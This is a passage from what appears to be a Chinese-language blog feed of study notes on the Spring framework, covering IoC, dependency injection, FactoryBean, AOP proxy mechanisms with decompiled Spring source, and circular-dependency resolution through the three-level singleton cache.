<h2 id="1-2-AOP实现机制">1.2 AOP实现机制</h2>
<p>Spring AOP的实现依赖于动态代理技术。动态代理是在运行时动态生成代理对象，而不是在编译时。它允许开发者在运行时指定要代理的接口和行为，从而实现在不修改源码的情况下增强方法的功能。</p>
<p>Spring AOP支持两种动态代理：<br>
<strong>基于JDK的动态代理</strong>：使用java.lang.reflect.Proxy类和java.lang.reflect.InvocationHandler接口实现。这种方式需要代理的类实现一个或多个接口。<br>
<strong>基于CGLIB的动态代理</strong>：当被代理的类没有实现接口时，Spring会使用CGLIB库生成一个被代理类的子类作为代理。CGLIB（Code Generation Library）是一个第三方代码生成库，通过继承方式实现代理。</p>
<h1>2 IOC</h1>
<blockquote>
<p><strong>IoC（Inversion of Control:控制反转）</strong> 是一种设计思想，而不是一个具体的技术实现。IoC 的思想就是将原本在程序中手动<mark>创建对象的控制权</mark>，交由 Spring 框架来管理。通过IOC，程序实现了<em>对象的解耦合</em>，使得对象与对象之间是低耦合的，提高了程序的灵活性和可维护性。简单来说，Spring IOC就是让开发者不再需要手动创建对象，而是通过配置或注解等方式，让Spring容器来负责<strong>对象的创建、管理和依赖关系的注入</strong>。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>控制</strong>：指的是对象创建（实例化、管理）的权力</p>
</li>
<li class="lvl-2">
<p><strong>反转</strong>：控制权交给外部环境（Spring 框架、IoC 容器）</p>
</li>
</ul>
<blockquote>
<p>在传统的程序设计中，我们直接在对象内部通过new关键字来创建依赖的对象，这种方式会导致代码之间高度耦合，不利于测试和维护。而IoC的思想是，将这些对象的创建权交给Spring容器来管理，由Spring容器负责创建对象并注入依赖。这样，对象与对象之间的依赖关系就交由Spring来管理了，实现了程序的解耦合。在项目中，我们可以通过Spring的配置文件或者注解来定义Bean，然后由Spring容器来创建和管理这些Bean。在Mybatis中，我们可以将SqlSessionFactory、Mapper等对象的创建和依赖关系交由Spring来管理。</p>
</blockquote>
<blockquote>
<p>Spring框架中的IOC（Inverse of Control，控制反转）是一种设计原则，也是Spring框架的核心之一。==IOC的概念是指控制权的转移，即将对象的创建、依赖注入和生命周期管理等控制权交给了容器来管理，而不是由对象自己来控制。==这种控制反转的思想使得应用程序的组件之间的关系变得更加灵活、可维护和可测试。</p>
<p><mark>在Spring框架中，IOC的实现主要通过依赖注入（Dependency Injection，DI）来实现。依赖注入是指容器负责在对象创建的同时，自动将对象所依赖的其他对象注入到它们之中，而不是由对象自己来创建或查找依赖的对象。</mark></p>
<p>Spring框架通过XML配置文件、注解或Java代码来描述对象之间的依赖关系，然后由Spring容器在运行时根据这些配置来实现依赖注入。通过IOC容器管理对象之间的依赖关系，使得应用程序的组件解耦，提高了代码的灵活性和可维护性。</p>
<p>Spring的IOC容器通过控制对象之间的依赖关系，实现了对象之间的解耦，提高了代码的灵活性和可测试性，是Spring框架的核心特性之一。</p>
</blockquote>
<blockquote>
<p>[!note] 依赖注入（Dependency Injection，简称 DI）</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>基于字段的依赖注入</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Store</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Item item; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>基于构造函数的依赖注入</p>
</li>
<li class="lvl-2">
<p>基于setter方法的依赖注入</p>
</li>
</ul>
<h2 id="2-1-为什么依赖注入不适合使用字段注入">2.1 为什么依赖注入不适合使用字段注入</h2>
<p>依赖注入有三种主要的方式：构造函数注入、Setter方法注入和字段注入。虽然字段注入是最简洁的一种方式，但它也存在一些问题，这就是为什么在某些情况下不推荐使用字段注入的原因。</p>
<ol>
<li class="lvl-3">
<p><strong>可测试性差：</strong> 字段注入使得依赖关系被硬编码到了类的字段中，这导致在进行单元测试时很难对这些依赖进行模拟或替换。因为字段注入的依赖是直接赋值给类的字段，而不是通过构造函数或Setter方法来传递，所以在测试时很难通过传入不同的依赖实例来进行测试。</p>
</li>
<li class="lvl-3">
<p><strong>难以追踪依赖关系：</strong> 使用字段注入时，依赖关系是通过字段直接注入到类中的，这使得依赖关系不够明确，很难追踪类与其依赖之间的关系。这可能导致代码的可读性和可维护性下降。</p>
</li>
<li class="lvl-3">
<p><strong>耦合性高：</strong> 字段注入使得依赖关系与类的实现紧密耦合在一起，从而增加了类与其依赖之间的耦合性。当需要修改依赖关系时，可能需要修改类的字段定义，这违反了开闭原则。</p>
</li>
</ol>
<p>相比之下，构造函数注入和Setter方法注入提供了更好的解耦性和可测试性。构造函数注入将依赖关系通过构造函数传入，而Setter方法注入则通过Setter方法设置依赖。这两种方式都能够清晰地标识出类与其依赖之间的关系，提高了代码的可读性和可维护性，同时也更易于进行单元测试和模拟依赖。因此，在使用依赖注入时，推荐优先考虑使用构造函数注入或Setter方法注入，而尽量避免使用字段注入。</p>
<h2 id="2-2-FactoryBean">2.2 FactoryBean</h2>
<blockquote>
<p>Spring容器提供的一种可以扩展容器对象实例化逻辑的接口。其本身与其他注册到容器的对象一样，只是一个Bean，只不过，这种类型的Bean本身就是生产对象的工厂（Factory）。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">FactoryBean</span>&#123;</span><br><span class="line">	<span class="comment">//返回该FactoryBean生产的对象实例，实现该方法给出自己的对象实例化逻辑</span></span><br><span class="line">	Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">	<span class="comment">//返回getObject方法所返回的对象类型</span></span><br><span class="line">	Class <span class="title function_">getObjectType</span><span class="params">()</span>;</span><br><span class="line">	<span class="comment">//getObject生产的对象是否以singleton形式存在于容器中</span></span><br><span class="line">	<span class="type">boolean</span> <span class="title function_">isSingleton</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>FactoryBean类型的bean定义，通过正常的id引用，容器返回的是FactoryBean所生产的对应类型，而非FactoryBean实现本身。可以通过在bean定义的id之前加前缀&amp;来取得FactoryBean本身。</p>
<h1>3 AOP</h1>
<blockquote>
<p>[!node]<br>
AOP(Aspect-Oriented Programming:面向切面编程)能够将那些与业务无关，却为业务模块所共同调用的逻辑或责任（例如事务处理、日志管理、权限控制等）封装起来，便于减少系统的重复代码，降低模块间的耦合度，并有利于未来的可拓展性和可维护性。</p>
</blockquote>
<blockquote>
<p>AOP（Aspect Oriented Programming）即面向切面编程，AOP 是 OOP（面向对象编程）的一种延续，二者互补，并不对立。<br>
AOP 的目的是将横切关注点（如日志记录、事务管理、权限控制、接口限流、接口幂等等）从核心业务逻辑中分离出来，通过动态代理、字节码操作等技术，实现代码的复用和解耦，提高代码的可维护性和可扩展性。<br>
OOP 的目的是将业务逻辑按照对象的属性和行为进行封装，通过类、对象、继承、多态等概念，实现代码的模块化和层次化（也能实现代码的复用），提高代码的可读性和可维护性。</p>
</blockquote>
<p>AOP，即面向切面编程，是Spring提供的另一个重要特性。它允许开发者在不修改原有业务逻辑的情况下，增强或扩展程序的功能。AOP通过预定义的切点（例如方法执行前、方法执行后等）来织入切面逻辑，从而实现对原有功能的增强。在项目中，我们可以使用AOP来实现日志记录、事务管理、安全检查等功能。在Mybatis中，我们可以使用AOP来实现对数据库操作的日志记录、性能监控等功能。</p>
<h2 id="3-1-相关概念">3.1 相关概念</h2>
<table>
<thead>
<tr>
<th>术语</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>目标(Target)</td>
<td>被通知的对象</td>
</tr>
<tr>
<td>代理(Proxy)</td>
<td>向目标对象应用通知之后创建的代理对象</td>
</tr>
<tr>
<td>连接点(JoinPoint)</td>
<td>目标对象的所属类中，定义的所有方法均为连接点</td>
</tr>
<tr>
<td>切入点(Pointcut)</td>
<td>被切面拦截 / 增强的连接点（切入点一定是连接点，连接点不一定是切入点）</td>
</tr>
<tr>
<td>通知(Advice)</td>
<td>增强的逻辑 / 代码，也即拦截到目标对象的连接点之后要做的事情</td>
</tr>
<tr>
<td>切面(Aspect)</td>
<td>切入点(Pointcut)+通知(Advice)，切面是一个模块化单元，它封装了横切关注点，并定义了在何处、何时应用这些关注点。在Spring框架中，切面通常以Java类的形式存在</td>
</tr>
<tr>
<td>Weaving(织入)</td>
<td>将通知应用到目标对象，进而生成代理对象的过程动作</td>
</tr>
</tbody>
</table>
<h2 id="3-2-应用场景">3.2 应用场景</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>日志记录：自定义日志记录注解，利用 AOP，一行代码即可实现日志记录。</p>
</li>
<li class="lvl-2">
<p>性能统计：利用 AOP 在目标方法的执行前后统计方法的执行时间，方便优化和分析。</p>
</li>
<li class="lvl-2">
<p>事务管理：<code>@Transactional</code> 注解可以让 Spring 为我们进行事务管理比如回滚异常操作，免去了重复的事务管理逻辑。<code>@Transactional</code>注解就是基于 AOP 实现的。</p>
</li>
<li class="lvl-2">
<p>权限控制：利用 AOP 在目标方法执行前判断用户是否具备所需要的权限，如果具备，就执行目标方法，否则就不执行。例如，SpringSecurity 利用<code>@PreAuthorize</code> 注解一行代码即可自定义权限校验。</p>
</li>
<li class="lvl-2">
<p>接口限流：利用 AOP 在目标方法执行前通过具体的限流算法和实现对请求进行限流处理。</p>
</li>
<li class="lvl-2">
<p>缓存管理：利用 AOP 在目标方法执行前后进行缓存的读取和更新</p>
</li>
</ul>
<h2 id="3-3-代理方式">3.3 代理方式</h2>
<p>AOP 的常见实现方式有动态代理、字节码操作等方式。</p>
<p>动态代理机制和字节码生成都是在运行期间为目标对象生成一个代理对象，而将横切逻辑织入到这个代理对象中，系统最终使用的是织入了横切逻辑的代理对象，而不是真正的目标对象。</p>
<p><strong>基于代理的AOP：</strong> Spring使用动态代理来实现AOP。当一个类被AOP代理后，方法调用会被拦截，从而允许切面在方法调用前、后或者出现异常时执行额外的逻辑。Spring中的基于代理的AOP主要使用JDK动态代理和CGLIB动态代理来实现。</p>
<ol>
<li class="lvl-3">
<p>动态代理</p>
</li>
<li class="lvl-3">
<p>动态字节码增强(CGLIB, Code Generation Library)<br>
CGLIB可以对实现了某种接口的类，或者没有实现任何接口的类进行扩展</p>
</li>
</ol>
<h3 id="3-3-1-动态代理">3.3.1 动态代理</h3>
<p>Spring AOP 就是基于动态代理的，如果要代理的对象，实现了某个接口，那么 Spring AOP 会使用 <strong>JDK Proxy</strong>，去创建代理对象，而对于没有实现接口的对象，就无法使用 JDK Proxy 去进行代理了。</p>
<p>动态代理（Dynamic Proxy）机制，可以在运行期间，为相应的接口（interface）动态生成对应的代理对象。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408181748237.png" alt="image.png"></p>
<h3 id="3-3-2-Cgllib">3.3.2 Cgllib</h3>
<p>要代理的对象，没有实现接口，Spring AOP 会使用 <strong>Cglib</strong> 生成一个被代理对象的子类来作为代理<br>
CGLIB可以对实现了某种接口的类，或者没有实现任何接口的类进行扩展。</p>
<h3 id="3-3-3-Spring-AOP-和-AspectJ-AOP-有什么区别？">3.3.3 Spring AOP 和 AspectJ AOP 有什么区别？</h3>
<p><strong>Spring AOP 属于运行时增强，而 AspectJ 是编译时增强。</strong> Spring AOP 基于代理(Proxying)，而 AspectJ 基于字节码操作(Bytecode Manipulation)。</p>
<p>Spring AOP 已经集成了 AspectJ ，AspectJ 应该算的上是 Java 生态系统中最完整的 AOP 框架了。AspectJ 相比于 Spring AOP 功能更加强大，但是 Spring AOP 相对来说更简单，</p>
<p>如果我们的切面比较少，那么两者性能差异不大。但是，当切面太多的话，最好选择 AspectJ ，它比 Spring AOP 快很多。</p>
<h3 id="3-3-4-Spring-AOP">3.3.4 Spring AOP</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">postProcessBeforeInstantiation</span><span class="params">(Class&lt;?&gt; beanClass, String beanName)</span> <span class="keyword">throws</span> BeansException &#123;  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">cacheKey</span> <span class="operator">=</span> <span class="built_in">this</span>.getCacheKey(beanClass, beanName);  </span><br><span class="line">    <span class="keyword">if</span> (beanName == <span class="literal">null</span> || !<span class="built_in">this</span>.targetSourcedBeans.contains(beanName)) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.advisedBeans.containsKey(cacheKey)) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isInfrastructureClass(beanClass) || <span class="built_in">this</span>.shouldSkip(beanClass, beanName)) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.advisedBeans.put(cacheKey, Boolean.FALSE);  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (beanName != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">TargetSource</span> <span class="variable">targetSource</span> <span class="operator">=</span> <span class="built_in">this</span>.getCustomTargetSource(beanClass, beanName);  </span><br><span class="line">        <span class="keyword">if</span> (targetSource != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.targetSourcedBeans.add(beanName);  </span><br><span class="line">            Object[] specificInterceptors = <span class="built_in">this</span>.getAdvicesAndAdvisorsForBean(beanClass, beanName, targetSource);  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="built_in">this</span>.createProxy(beanClass, beanName, specificInterceptors, targetSource);  </span><br><span class="line">            <span class="built_in">this</span>.proxyTypes.put(cacheKey, proxy.getClass());  </span><br><span class="line">            <span class="keyword">return</span> proxy;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">shouldSkip</span><span class="params">(Class&lt;?&gt; beanClass, String beanName)</span> &#123;  </span><br><span class="line">	<span class="comment">//获取切面信息</span></span><br><span class="line">    List&lt;Advisor&gt; candidateAdvisors = <span class="built_in">this</span>.findCandidateAdvisors();  </span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> candidateAdvisors.iterator();  </span><br><span class="line">  </span><br><span class="line">    Advisor advisor;  </span><br><span class="line">    <span class="keyword">do</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (!var4.hasNext()) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.shouldSkip(beanClass, beanName);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        advisor = (Advisor)var4.next();  </span><br><span class="line">    &#125; <span class="keyword">while</span>(!(advisor <span class="keyword">instanceof</span> AspectJPointcutAdvisor) || !((AbstractAspectJAdvice)advisor.getAdvice()).getAspectName().equals(beanName));  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> List&lt;Advisor&gt; <span class="title function_">findCandidateAdvisors</span><span class="params">()</span> &#123;  </span><br><span class="line">    List&lt;Advisor&gt; advisors = <span class="built_in">super</span>.findCandidateAdvisors();  </span><br><span class="line">    advisors.addAll(<span class="built_in">this</span>.aspectJAdvisorsBuilder.buildAspectJAdvisors());  </span><br><span class="line">    <span class="keyword">return</span> advisors;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Advisor&gt; <span class="title function_">buildAspectJAdvisors</span><span class="params">()</span> &#123;  </span><br><span class="line">    List&lt;String&gt; aspectNames = <span class="built_in">this</span>.aspectBeanNames;  </span><br><span class="line">    <span class="keyword">if</span> (aspectNames == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;  </span><br><span class="line">            aspectNames = <span class="built_in">this</span>.aspectBeanNames;  </span><br><span class="line">            <span class="keyword">if</span> (aspectNames == <span class="literal">null</span>) &#123;  </span><br><span class="line">                List&lt;Advisor&gt; advisors = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();  </span><br><span class="line">                List&lt;String&gt; aspectNames = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();  </span><br><span class="line">                </span><br><span class="line">                String[] beanNames = BeanFactoryUtils.beanNamesForTypeIncludingAncestors(<span class="built_in">this</span>.beanFactory, Object.class, <span class="literal">true</span>, <span class="literal">false</span>);  </span><br><span class="line">                String[] var18 = beanNames;  </span><br><span class="line">                <span class="type">int</span> <span class="variable">var19</span> <span class="operator">=</span> beanNames.length;  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>; var7 &lt; var19; ++var7) &#123;  </span><br><span class="line">                    <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> var18[var7];  </span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.isEligibleBean(beanName)) &#123;  </span><br><span class="line">                        Class&lt;?&gt; beanType = <span class="built_in">this</span>.beanFactory.getType(beanName);  </span><br><span class="line">                        <span class="comment">//判断是否为切面</span></span><br><span class="line">                        <span class="keyword">if</span> (beanType != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.advisorFactory.isAspect(beanType)) &#123;  </span><br><span class="line">                            aspectNames.add(beanName);  </span><br><span class="line">                            <span class="type">AspectMetadata</span> <span class="variable">amd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AspectMetadata</span>(beanType, beanName);  </span><br><span class="line">                            <span class="keyword">if</span> (amd.getAjType().getPerClause().getKind() == PerClauseKind.SINGLETON) &#123;  </span><br><span class="line">                                <span class="type">MetadataAwareAspectInstanceFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanFactoryAspectInstanceFactory</span>(<span class="built_in">this</span>.beanFactory, beanName);  </span><br><span class="line">                                <span class="comment">//获取所有的切面列表</span></span><br><span class="line">                                List&lt;Advisor&gt; classAdvisors = <span class="built_in">this</span>.advisorFactory.getAdvisors(factory);  </span><br><span class="line">                                <span class="keyword">if</span> (<span class="built_in">this</span>.beanFactory.isSingleton(beanName)) &#123;  </span><br><span class="line">                                    <span class="built_in">this</span>.advisorsCache.put(beanName, classAdvisors);  </span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                                    <span class="built_in">this</span>.aspectFactoryCache.put(beanName, factory);  </span><br><span class="line">                                &#125;  </span><br><span class="line">  </span><br><span class="line">                                advisors.addAll(classAdvisors);  </span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                                <span class="keyword">if</span> (<span class="built_in">this</span>.beanFactory.isSingleton(beanName)) &#123;  </span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Bean with name &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27; is a singleton, but aspect instantiation model is not singleton&quot;</span>);  </span><br><span class="line">                                &#125;  </span><br><span class="line">  </span><br><span class="line">                                <span class="type">MetadataAwareAspectInstanceFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrototypeAspectInstanceFactory</span>(<span class="built_in">this</span>.beanFactory, beanName);  </span><br><span class="line">                                <span class="built_in">this</span>.aspectFactoryCache.put(beanName, factory);  </span><br><span class="line">                                advisors.addAll(<span class="built_in">this</span>.advisorFactory.getAdvisors(factory));  </span><br><span class="line">                            &#125;  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                <span class="built_in">this</span>.aspectBeanNames = aspectNames;  </span><br><span class="line">                <span class="keyword">return</span> advisors;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Advisor <span class="title function_">getAdvisor</span><span class="params">(Method candidateAdviceMethod, MetadataAwareAspectInstanceFactory aspectInstanceFactory, <span class="type">int</span> declarationOrderInAspect, String aspectName)</span> &#123;  </span><br><span class="line">    <span class="built_in">this</span>.validate(aspectInstanceFactory.getAspectMetadata().getAspectClass());  </span><br><span class="line">    <span class="type">AspectJExpressionPointcut</span> <span class="variable">expressionPointcut</span> <span class="operator">=</span> <span class="built_in">this</span>.getPointcut(candidateAdviceMethod, aspectInstanceFactory.getAspectMetadata().getAspectClass());  </span><br><span class="line">    <span class="keyword">return</span> expressionPointcut == <span class="literal">null</span> ? <span class="literal">null</span> : <span class="keyword">new</span> <span class="title class_">InstantiationModelAwarePointcutAdvisorImpl</span>(expressionPointcut, candidateAdviceMethod, <span class="built_in">this</span>, aspectInstanceFactory, declarationOrderInAspect, aspectName);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403132049981.png" alt="image.png"></p>
<h1>4 参考</h1>
<p><a href="https://juejin.cn/post/6844903987062243341">Spring AOP - 注解方式使用介绍（长文详解） - 掘金 (juejin.cn)</a><br>
<a href="https://blog.csdn.net/ww2651071028/article/details/129486012">深度剖析Spring AOP源码，图文详解，小白也能看明白。-CSDN博客</a><a href="https://blog.csdn.net/hys__handsome/article/details/121011807">动态代理异常com.sun.proxy.$Proxy cannot be cast to-CSDN博客</a><a href="https://mp.weixin.qq.com/s/ab-MLI2VyK9fdTtio5Y9Wg">面试官：谈谈你对 IoC 和 AOP 的理解！ (qq.com)</a></p>
]]></content>
      <categories>
        <category>开发框架</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/01/11/%E6%A1%86%E6%9E%B6/Spring/Spring%EF%BC%9A%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/</url>
    <content><![CDATA[<h1>1 循环依赖方式</h1>
<h2 id="1-1-构造参数循环依赖">1.1 构造参数循环依赖</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">	<span class="keyword">private</span>  B b;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">A</span><span class="params">(B b)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.b=b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line">	<span class="keyword">private</span>  A a;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">B</span><span class="params">(A a)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.a=a;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span> <span class="attr">class</span>=<span class="string">&quot;...A&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;b&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;b&quot;</span> <span class="attr">class</span>=<span class="string">&quot;...B&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Spring先创建(singleton) A，A依赖B，将A放进当前创建Bean池中；然后创建B，B依赖A，将B放进当前创建Bean池中，然后发现A已经在池中。</p>
<h2 id="1-2-setter方式（单例，singleton），默认方式">1.2 setter方式（单例，singleton），默认方式</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405291646045.png" alt="image.png"></p>
<p>Spring是先将Bean对象实例化之后再设置对象属性的</p>
<h2 id="1-3-setter方式（原型，prototype）">1.3 setter方式（原型，prototype）</h2>
<blockquote>
<p>scope=“prototype”，每次请求都会创建一个实例对象</p>
</blockquote>
<h1>2 循环依赖(circular reference)</h1>
<p>在 Spring 中，循环依赖是指两个或多个 Bean 之间互相依赖的情况，导致 Bean 的创建发生循环，从而无法完成依赖注入的过程。这种情况可能会导致应用程序启动失败或者出现不可预测的行为。</p>
<p>Spring 框架提供了一些解决循环依赖的机制：</p>
<ol>
<li class="lvl-3">
<p><strong>提前曝光（Early Exposure）：</strong> Spring 容器在创建 Bean 的过程中，会提前暴露正在创建的 Bean 实例，以解决循环依赖的问题。当一个 Bean A 依赖另一个 Bean B，而 Bean B 又依赖 Bean A 时，Spring 在创建 Bean A 的过程中，会提前暴露一个代理对象，用于处理 Bean B 对 Bean A 的依赖。这样，Bean A 可以在被完全创建之前，通过代理对象来访问 Bean B。这种方式需要使用 CGLIB 来创建代理对象。</p>
</li>
<li class="lvl-3">
<p><strong>构造函数注入：</strong> 使用构造函数注入来解决循环依赖问题。Spring 容器在创建 Bean 的过程中，会首先将依赖项通过构造函数传递进去，从而避免了循环依赖的问题。这种方式需要谨慎使用，因为构造函数注入会将循环依赖暴露在类的构造函数中，可能导致代码不够清晰。</p>
</li>
<li class="lvl-3">
<p><strong>Setter 方法注入：</strong> 使用 Setter 方法注入来解决循环依赖问题。与构造函数注入类似，通过将依赖项通过 Setter 方法注入，可以避免循环依赖的问题。与构造函数注入相比，Setter 方法注入更加灵活，可以在 Bean 创建完成后再进行依赖注入，但也需要注意循环依赖可能带来的问题。</p>
</li>
</ol>
<p>虽然 Spring 提供了这些解决循环依赖的机制，但是在设计应用程序时，尽量避免出现循环依赖是更好的选择。循环依赖会导致代码的复杂性增加，降低程序的可维护性和可读性。</p>
<h1>3 三级缓存解决循环依赖</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>一级缓存（singletonObjects）</strong>：存放最终形态的 Bean（已经实例化、属性填充、初始化），单例池，为“Spring 的单例属性”⽽⽣。一般情况我们获取 Bean 都是从这里获取的，但是并不是所有的 Bean 都在单例池里面，例如原型 Bean 就不在里面。</p>
</li>
<li class="lvl-2">
<p><strong>二级缓存（earlySingletonObjects）</strong>：存放过渡 Bean（半成品，尚未属性填充），也就是三级缓存中<code>ObjectFactory</code>产生的对象，与三级缓存配合使用的，可以防止 AOP 的情况下，每次调用<code>ObjectFactory#getObject()</code>都是会产生新的代理对象的。</p>
</li>
<li class="lvl-2">
<p><strong>三级缓存（singletonFactories）</strong>：存放<code>ObjectFactory</code>，<code>ObjectFactory</code>的<code>getObject()</code>方法（最终调用的是<code>getEarlyBeanReference()</code>方法）可以生成原始 Bean 对象或者代理对象（如果 Bean 被 AOP 切面代理）。三级缓存只会对单例 Bean 生效。</p>
</li>
</ul>
<h2 id="3-1-Spring-创建-Bean-的流程：">3.1 Spring 创建 Bean 的流程：</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>先去 <strong>一级缓存 <code>singletonObjects</code></strong> 中获取，存在就返回；</p>
</li>
<li class="lvl-2">
<p>如果不存在或者对象正在创建中，于是去 <strong>二级缓存 <code>earlySingletonObjects</code></strong> 中获取；</p>
</li>
<li class="lvl-2">
<p>如果还没有获取到，就去 <strong>三级缓存 <code>singletonFactories</code></strong> 中获取，通过执行 <code>ObjectFacotry</code> 的 <code>getObject()</code> 就可以获取该对象，获取成功之后，从三级缓存移除，并将该对象加入到二级缓存中。</p>
</li>
</ul>
<blockquote>
<p>[!note]<br>
<strong>只用两级缓存够吗？</strong> 在没有 AOP 的情况下，确实可以只使用一级和三级缓存来解决循环依赖问题。但是，当涉及到 AOP 时，二级缓存就显得非常重要了，因为它确保了即使在 Bean 的创建过程中有多次对早期引用的请求，也始终只返回同一个代理对象，从而避免了同一个 Bean 有多个代理对象的问题。</p>
</blockquote>
<h1>4 Spring源码</h1>
